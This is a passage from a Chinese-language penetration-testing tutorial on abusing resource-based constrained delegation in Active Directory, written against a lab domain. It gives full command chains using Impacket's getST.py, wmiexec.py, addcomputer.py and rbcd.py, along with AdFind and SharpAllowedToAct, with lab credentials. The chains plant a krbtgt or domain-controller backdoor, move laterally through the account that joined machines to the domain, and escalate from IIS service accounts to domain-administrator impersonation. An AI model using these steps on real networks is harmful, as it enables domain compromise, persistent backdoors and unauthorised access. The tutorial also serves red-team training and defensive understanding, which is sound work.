和上述利用方式一致：用A账号getST模拟administrator获取访问B的ST，ptt，wmiexec。
## 基于资源的约束委派
### 概述
配置约束委派，必须拥有`SeEnableDelegation`特权，该特权很敏感，通常仅授予域管理员。为了使用户/资源更加独立，Windows Server
2012中引入了基于资源的约束委派。  
传统的约束委派是"正向的"，通过将service2的SPN添加到service1的`msDS-AllowedToDelegateTo`属性中，并且配置service1的`TrustedToAuthenticationForDelegation`属性为true。传统的约束委派S4U2self返回的票据一定是可转发的，如果不可转发那么S4U2proxy将失败；但是基于资源的约束委派不同，就算S4U2self返回的票据不可转发，S4U2proxy也是可以成功，并且S4U2proxy返回的票据总是可转发。  
同时基于资源的约束委派(RBCD)配置则是相反的，通过将service1的SID添加到service2的`msDS-AllowedToActOnBehalfOfOtherIdentity`属性中，就可以达到相同目的。  
基于资源的约束委派具有传统的约束委派的所有安全问题，因为我们只需要拥有修改`msDS-AllowedToActOnBehalfOfOtherIdentity`属性的权限，所以RBCD的利用比较于传统的约束委派场景多也简单。  
默认情况下以下账户拥有修改`msDS-AllowedToActOnBehalfOfOtherIdentity`属性的权限：
  * **Domain Admins** (域管理员)
  * **mS-DS-CreatorSID** (将该机器加入域的账户)
  * **NT AUTHORITY\SELF** (机器账户本身)
RBCD的利用条件：
  * 能修改`msDS-AllowedToActOnBehalfOfOtherIdentity`属性的权限
  * 一个具有SPN的账户的TGT
### 利用场景
针对上述情况可衍生的利用场景。
#### 后门
需要域管理员权限，修改krbtgt或是域控的`msDS-AllowedToActOnBehalfOfOtherIdentity`属性，加入已知后门账户的SID。 **`Domain Admins`**  
使用ActiveDirectory模块，域控2012及以上默认安装。
    Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount lisi
    Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount
    getST.py -dc-ip 192.168.17.134 -spn krbtgt -impersonate administrator 0ne.test/lisi:ls@123456
    wmiexec.py -dc-ip 192.168.17.134 -no-pass -k PI:EMAIL
    Set-ADComputer DC2012 -PrincipalsAllowedToDelegateToAccount lisi
    Get-ADComputer DC2012 -Properties PrincipalsAllowedToDelegateToAccount
    getST.py -dc-ip 192.168.17.134 -spn ldap/DC2012.0ne.test -impersonate administrator 0ne.test/lisi:ls@123456
#### 横向
A配置了到B的RBCD，打下A就可以打下B。 **`和约束委派横向利用场景一致`**  
某公司有专门加域的域用户A或是其有添加过多台机器入域，获取该账户的权限后，可利用基于资源的约束委派修改机器属性，批量获取机器权限。 **`mS-DS-CreatorSID`**  
如果我们想拿域内机器A的权限，如果我们又没有机器A的administrators组成员凭据的话还可以看机器A是通过哪个用户加入域的，控制了这个用户A依然可以获取权限。
**`mS-DS-CreatorSID`**  
假如张三就是上述用户A。  
如何查找类似的用户，非域管加域机器才会有`mS-DS-CreatorSID`属性：
    AdFind.exe -b "DC=0ne,DC=test" -f "(&(samAccountType=805306369))" cn mS-DS-CreatorSID
    AdFind.exe -b "DC=0ne,DC=test" -f "(&(objectsid=S-1-5-21-xxxxxxxx))" objectclass cn dn
win7和web01的`mS-DS-CreatorSID`的值相同，都是被zhangsan加入域。  
通过一定手段打下张三，然后添加机器账号，设置test01到WIN7的RBCD：
    addcomputer.py -dc-ip 192.168.17.134 -computer-name 'test01$' -computer-pass test@123456 0ne.test/zhangsan:zs@123456
    rbcd.py -f test01 -t win7 -dc-ip 192.168.17.134 0ne\\zhangsan:zs\@123456
模拟域管理员administrator账号申请访问win7的ST，ptt，然后wmiexec到目标主机:
    getST.py -spn cifs/win7.0ne.test -impersonate administrator -dc-ip 192.168.17.134 0ne.test/test01$:test@123456
    wmiexec.py -dc-ip 192.168.17.134 -no-pass -k PI:EMAIL
同理WEB01也可以打下来。
#### 提权
获取某域内web服务器的iis apppool\defaultapppool或是network
service账户权限，虽然是低权限用户，但是这些账户出网时都是以当前机器账户身份，可以利用RBCD进行提权。 **`NT
AUTHORITY\SELF`**
使用, 添加机器账户并设置iis到web01的RBCD：
    SharpAllowedToAct.exe -m iis -p iis -t WEB01 -a DC2012.0ne.test -d 0ne.test
模拟域管理员administrator账号申请访问web01的ST，ptt，然后wmiexec到目标主机:
    getST.py -spn cifs/web01.0ne.test -impersonate administrator -dc-ip 192.168.17.134 0ne.test/iis$:iis
    wmiexec.py -dc-ip 192.168.17.134 -no-pass -k PI:EMAIL
某企业新员工张三入职后用工作电脑加入公司域时，使用的自己域账号，在攻防演习中被钓鱼上线，但是发现该用户没有在本地管理员组里面，可利用RBCD进行提权。
**`mS-DS-CreatorSID`**  
域内获取某台主机低权限，可通过获取到机器加域的账号权限，再利用RBCD进行提权。 **`mS-DS-CreatorSID`**  
这两场景和RBCD横向利用场景一致：加域账号->添加机器账号->设置RBCD->getST，ptt。
## 参考
感谢`3t2ugg1e`师傅的服务云课堂分享，还有在网上愿意技术分享的各位师傅们。  
[利用资源约束委派进行的提权攻击分析](http://blog.nsfocus.net/analysis-attacks-entitlement-resource-constrained-delegation/ "利用资源约束委派进行的提权攻击分析")  
[微软不认的“0day”之域内本地提权-烂番茄（Rotten
Tomato）](https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie/#redteamweb3user "微软不认的“0day”之域内本地提权-烂番茄（Rotten
Tomato）")  
[daiker师傅的windows-protocol](https://daiker.gitbook.io/windows-protocol/
"daiker师傅的windows-protocol")  
[1.3.3 Protocol Overview](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/1fb9caca-449f-4183-8f7a-1a5fc7e7290a
"1.3.3 Protocol Overview")